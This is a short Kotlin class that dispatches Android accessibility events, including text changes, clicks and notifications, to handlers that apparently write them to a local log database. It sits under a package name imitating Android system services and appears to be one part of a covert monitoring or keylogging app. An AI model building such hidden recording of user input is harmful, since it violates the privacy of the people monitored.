package com.android.services.accessibility.manager

import android.content.Context
import com.android.services.accessibility.AccessibilityEventType
import com.android.services.accessibility.data.*
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.AccessibilityEventModel

class AccessibilityManager(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource
) {

    fun goThroughAccessibilityEvent(
        eventType: AccessibilityEventType,
        accessibilityEventModel: AccessibilityEventModel
    ) {
        when (eventType) {
            AccessibilityEventType.TYPE_VIEW_CLICKED -> ViewClickedEventData(localDatabaseSource).onAccessibilityEvent(
                context, accessibilityEventModel
            )
            AccessibilityEventType.TYPE_VIEW_LONG_CLICKED -> ViewLongClickedEventData().onAccessibilityEvent(
                context, accessibilityEventModel
            )
            AccessibilityEventType.TYPE_WINDOW_CONTENT_CHANGED -> WindowContentChangeEventData(
                localDatabaseSource
            ).onAccessibilityEvent(context, accessibilityEventModel)
            AccessibilityEventType.TYPE_WINDOW_STATE_CHANGED -> WindowStateChangeEventData(
                localDatabaseSource
            ).onAccessibilityEvent(
                context, accessibilityEventModel
            )
            AccessibilityEventType.TYPE_VIEW_TEXT_CHANGED -> ViewTextChangeEventData(
                localDatabaseSource
            ).onAccessibilityEvent(context, accessibilityEventModel)
            AccessibilityEventType.TYPE_NOTIFICATION_STATE_CHANGED ->
                NotificationStateChangedData(localDatabaseSource).onAccessibilityEvent(
                    context,
                    accessibilityEventModel
                )
        }
    }
}